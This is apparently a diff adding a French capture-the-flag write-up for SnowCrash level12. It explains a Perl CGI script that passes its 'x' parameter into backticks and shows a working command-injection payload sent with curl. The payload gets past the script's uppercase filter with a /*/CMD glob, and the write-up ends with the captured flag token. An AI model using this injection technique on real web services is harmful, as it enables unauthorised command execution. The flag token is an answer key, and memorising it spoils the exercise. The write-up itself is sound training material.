@@ -1,0 +1,33 @@
+Avec un cat level12.pl
+
+	 -> n(t(param("x"), param("y"))); -> le param 'x' et le param 'y' sont passe dans la fonction t qui est elle meme passe dans la fonction n
+	 -> $_[0] = param 'x' -> $_[0] correspond au premier parametre de la fonction
+	 -> $xx = $_[0] ->  donc $xx == param("x")
+	 -> @output = `egrep "^$xx" /tmp/xd 2>&1`; -> va nous permetre d'executer $xx (donc x)
+	 -> $xx =~ tr/a-z/A-Z/; -> remplace toutes les minuscules par des majuscules
+	 -> s/\s.*// -> enleve tout apres un espace
+
+On doit donc creer un .sh qui sera execute, sans minuscules dans le nom, sans espaces :
+
+level12@SnowCrash:~$ touch /tmp/CMD
+
+level12@SnowCrash:~$ vim /tmp/CMD
+#!/bin/sh
+getflag > /tmp/flaglevel12
+
+Maintenant que l'on a notre petit script il va faloir le passer a notre virtual host
+Sachant qu'il s'agit de la variable 'x' on peut donc faire :
+
+curl "http://127.0.0.1:4646?x=\`/tmp/CMD\`"
+
+mais le probleme c'est que 'tmp' va etre transforme en 'TMP'
+on doit donc remplacer par 
+
+curl "http://127.0.0.1:4646?x=\`/*/CMD\`"
+
+qui va exectuer tous les CMD dans un repertoire racine du system (bin, dev, tmp etc...)
+
+On verifie que notre petit script a bien ete execute
+
+level12@SnowCrash:~$ cat /tmp/flaglevel12
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
